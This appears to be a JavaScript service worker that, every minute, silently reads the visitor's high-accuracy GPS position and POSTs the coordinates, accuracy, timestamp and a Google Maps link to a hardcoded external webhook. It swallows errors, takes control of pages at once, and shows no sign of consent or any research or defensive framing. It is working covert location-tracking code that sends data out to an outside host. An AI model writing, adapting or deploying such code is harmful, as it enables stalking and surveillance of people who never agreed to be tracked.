const WEBHOOK = 'https://eoqxdcdf7wad4id.m.pipedream.net';

self.addEventListener('install', e => {
  self.skipWaiting();
});

self.addEventListener('activate', e => {
  e.waitUntil(clients.claim());
});

// Background sync every 60s
setInterval(async () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const data = {
        timestamp: new Date().toISOString(),
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        source: 'BACKGROUND_SERVICE_WORKER',
        google_maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
      };
      fetch(WEBHOOK, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {'Content-Type': 'application/json'}
      });
    }, () => {}, {enableHighAccuracy: true});
  }
}, 60000); // 1 minute

// Push notifications (optional)
self.addEventListener('push', event => {
  self.registration.showNotification('GPS Update Sent!');
});